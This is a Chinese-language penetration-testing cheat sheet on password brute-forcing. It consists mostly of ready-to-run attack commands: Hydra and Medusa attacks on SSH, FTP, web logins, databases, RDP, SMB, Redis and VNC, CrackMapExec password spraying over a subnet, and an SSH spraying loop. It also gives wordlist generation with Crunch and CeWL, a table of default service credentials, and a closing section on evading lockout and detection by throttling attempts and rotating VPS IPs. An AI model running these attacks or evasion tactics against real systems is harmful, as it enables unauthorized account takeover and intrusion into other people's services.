# 密码爆破实战参考
- 密码爆破工具 → `tools-hydra.md`

> 覆盖: Hydra → Medusa → Hashcat → 字典制作 → 协议速查 → 密码喷洒

> **last_updated**: 2026-06-04 | **tested_against**: Hydra 9.x, Medusa, Ncrack, Patator
---

## 1. Hydra 速查

### 1.1 常用协议

```bash
# === SSH ===
hydra -l root -P pass.txt ssh://target
hydra -L users.txt -P pass.txt ssh://target
hydra -l root -P pass.txt -t 4 ssh://target                    # 4线程, 防止触发防护

# === FTP ===
hydra -l anonymous -P pass.txt ftp://target
hydra -L users.txt -P pass.txt ftp://target

# === HTTP GET/POST ===
hydra -l admin -P pass.txt target http-get "/admin/"
hydra -l admin -P pass.txt target http-post-form "/login.php:user=^USER^&pass=^PASS^:Incorrect"  # :Incorrect=失败回显
hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed"

# === HTTP Basic Auth ===
hydra -l admin -P pass.txt target http-get "/protected/"

# === MySQL ===
hydra -l root -P pass.txt mysql://target

# === MSSQL ===
hydra -l sa -P pass.txt mssql://target

# === RDP ===
hydra -l administrator -P pass.txt rdp://target

# === SMB ===
hydra -l administrator -P pass.txt smb://target

# === Telnet ===
hydra -l root -P pass.txt telnet://target

# === PostgreSQL ===
hydra -l postgres -P pass.txt postgres://target

# === Redis ===
hydra -P pass.txt redis://target                 # Redis 通常无用户名

# === VNC ===
hydra -P pass.txt vnc://target                   # 通常只密码
```

### 1.2 关键参数

```bash
-t 4              # 线程数 (SSH/HTTPS 建议少线程)
-w 5              # 等待超时 (秒)  
-O                # 使用旧版 SSH 协议
-V                # 显示每次尝试
-vV               # 非常详细
-o result.txt     # 输出到文件
-R                # 恢复上次进度
-f                # 找到1个就停
-e ns             # 额外尝试: n=空密码, s=用户名=密码
```

---

## 2. Medusa

```bash
# 比 Hydra 更稳定 (某些协议)
medusa -h target -u root -P pass.txt -M ssh
medusa -h target -U users.txt -P pass.txt -M ssh -t 4
medusa -h target -U users.txt -P pass.txt -M ftp

# 查看支持的模块
medusa -d
```

---

## 3. 密码喷洒 (Password Spraying)

```bash
# ★ 关键: 大用户量 + 少量密码 (反爆破锁定的策略)

# === CrackMapExec (SMB/Windows 域) ===
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --local-auth

# === O365 / Azure AD 喷洒 ===
# 使用 MSOLSpray / CredMaster
# crackmapexec 也有 o365 模块

# === Web 登录喷洒 ===
# Burp Intruder: 用户名列表 + 固定密码"P@ssw0rd"
# 逐个尝试低频, 避开锁定

# === SSH 喷洒 ===
while read user; do
  sshpass -p 'Password123' ssh -o StrictHostKeyChecking=no $user@target 'id'
done < users.txt
```

---

## 4. 字典制作

### 4.1 定制字典原则

```
1. 基于目标的字典:
   - 公司名+年份/季节/特殊字符 (如 Google2024!)
   - 产品名+数字 (如 iPhone15pro)
   - 行业术语+数字

2. 基于键盘排布的字典:
   - Qwerty123!
   - 1qaz@WSX

3. 基于常见模式的字典:
   - Season+Year (Spring2024! Summer2024!)
   - Month+Year (January2024!)
   - CompanyName+@+Number
```

### 4.2 Crunch (字典生成器)

```bash
# 生成 6-8 位小写数字
crunch 6 8 -f charset.lst mixalpha-numeric -o dict.txt

# 模板: @ = 小写字母, , = 大写字母, % = 数字, ^ = 特殊字符
crunch 8 8 -t Pass@@%% -o dict.txt       # Passaa00 ~ Passzz99

# 带字符集
crunch 8 8 -p dog cat bird                 # 排列组合

# 从密码 dump 提取模式
# → 生成同模式不同内容的字典
```

### 4.3 Cewl (从目标网站爬取字典)

```bash
# 爬取网站生成针对字典
cewl -d 2 -m 5 -w wordlist.txt https://target.com
cewl -d 3 -m 6 --with-numbers -w wordlist.txt https://target.com

# -d = 深度, -m = 最小长度, --with-numbers = 含数字
```

---

## 5. 各协议默认凭据速查

| 服务 | 默认用户名 | 默认密码 |
|------|-----------|---------|
| MySQL | root | (空) / root |
| MSSQL | sa | (空) / sa |
| PostgreSQL | postgres | postgres |
| Oracle | system / sys | manager / change_on_install |
| Tomcat | admin / tomcat | admin / tomcat |
| Jenkins | admin | (安装时生成 / password) |
| Redis | — | (无) — 大多数未授权 |
| MongoDB | — | (无) — 老版本未授权 |
| FTP | anonymous | anonymous |
| ActiveMQ | admin | admin |
| RabbitMQ | guest | guest |
| phpMyAdmin | root | (空) |
| Elasticsearch | — | (无) |

---

## 6. 爆破防御规避

```bash
# 1. 慢速 (错开尝试)
hydra ... -t 1 -w 10 ...

# 2. 分布式 (多个出口IP轮流)
# 多台VPS + IP轮换

# 3. 密码喷洒 (多用户+少密码)
# 先试 2-3 个最常见密码 → 隔天再试

# 4. 利用忘记密码等来枚举用户 (无爆破风险)
# → 拿到用户名列表后再小规模爆破
```

---
## 相关参考
- 密码爆破工具 → `tools-hydra.md`

*参考: Hydra + CrackMapExec + 实战经验*
